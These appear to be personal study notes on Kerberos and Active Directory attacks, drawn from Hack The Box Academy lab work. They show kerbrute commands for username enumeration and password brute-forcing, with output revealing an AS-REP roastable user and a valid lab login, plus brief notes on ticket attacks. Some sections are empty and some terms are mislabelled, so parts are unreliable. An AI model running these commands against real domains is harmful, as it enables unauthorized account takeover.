## Understanding Kerberos protocol

The whole information it's provided by Hack The Box 
Academy.



### DNS
Active Directory Domain Services (AD DS) users DNS to allow clients
(workstations, servers, and other systems that communicate with
the domain) to locate Domain Controllers and for Domain Controllers 
that host the diretory service to communicate amongst themselves. 
DNS is used to resolve hostnames to IP addresses and is broadly
used across internal networks and the internet. Private internal
networks user Active Directory DNS



A simple example of DNS resolution



user with browser                       DNS server

Request for https://inlanefreight.com ===>  
Response    IP:134.209.24.248  <===







### LDAP



### Kerberos


With a several names, we get using user-anarchy, possible
usernames

and perform a kerbrute attack

```bash
kerbrute userenum -d <domain> --dc <ip address> user-list.txt
```

with this tool if there are any valid user in the user-list.txt
we get a hash referring to a Ticket Granted Ticket

```bash
❯ /opt/kerbrute  userenum -d <domain name "commonly .local or .htb"> --dc <ip address domain controller> unames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 05/29/23 - Ronnie Flathers @ropnop

2023/05/29 23:33:40 >  Using KDC(s):
2023/05/29 23:33:40 >   10.10.10.175:88

2023/05/29 23:33:40 >  [+] fsmith has no pre auth required. Dumping hash to crack offline:
$krb5asrep$18$<userdomain>@<domain>:<hash to crack it with john or hashcat>
2023/05/29 23:33:40 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2023/05/29 23:33:41 >  Done! Tested 24 usernames (1 valid) in 0.481 seconds
```

The code above it's an example of how can i do to get the TGT from kerbrute and
after that I cracked it and i get the password for the user fsmith and
connect it with evil-winrm







* TGT: Ticket Granting Ticket, it's the ticket presented to the KDC to obtain a TGS
* TGS: Ticket Granting Services, it's the ticket presented to a service which has resource that we want to connect
* KDC: Key Distribution Center, Kerberos services that has the role to distribute the tickets to the users installed in the DC
* AP: Application service



When you have users actives in a Active directory
you can perform a ASREPROAST attack

```bash
❯ /opt/kerbrute bruteuser -d <domain> --dc  <ip-address> <users files> passwords

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/05/23 - Ronnie Flathers @ropnop

2023/06/05 01:08:34 >  Using KDC(s):
2023/06/05 01:08:34 >   10.10.11.168:88

2023/06/05 01:08:35 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2023/06/05 01:08:35 >  Done! Tested 6 logins (1 successes) in 0.490 seconds
```

If we have a valid user and password (credentials), we can perform
a Kerberoasting Attack


## How the services request and response to the KDC

* HASH NTLM => AS-REQ (TGT?) => KDC
* HASH NTLM <= AS-REP (TGT) <= KDC
* HASH NTLM => TGS-REQ (TGS?) => KDC
* HASH NTLM <= TGS-REP (TGS) <= KDC



## Attacks based in the kind of hash

### **Golden Ticket Attack**


### **Silver Ticket Attack**
* (NTLM Hash)
* (Domain SID getPac.py)
* SPN





```Powershell
Get-ChildItem -Path "C:\Users\" -Filter "name of file" -Recurse
```



## Kerberos Authentication Process.


* 1. The user logs on, and their password is converted to an NTLM hash, which is used to encrypt the TGT ticket. This 
    decouples the user's credentials from requests to resources.

* 2. The KDC service on the DC checks the Authenticaiton Service request (AS-REQ), verifies the user information, and created a Ticket
 Granting Ticket (TGT), which is delivered to the user.

* 3. The user presents the TGT to the DC requesting a Ticket Granting Service (TGS) ticket for a specific
service. This is the TGS-REQ. If the TGT is successfully validated, its data is copied to create a TGS
ticket.
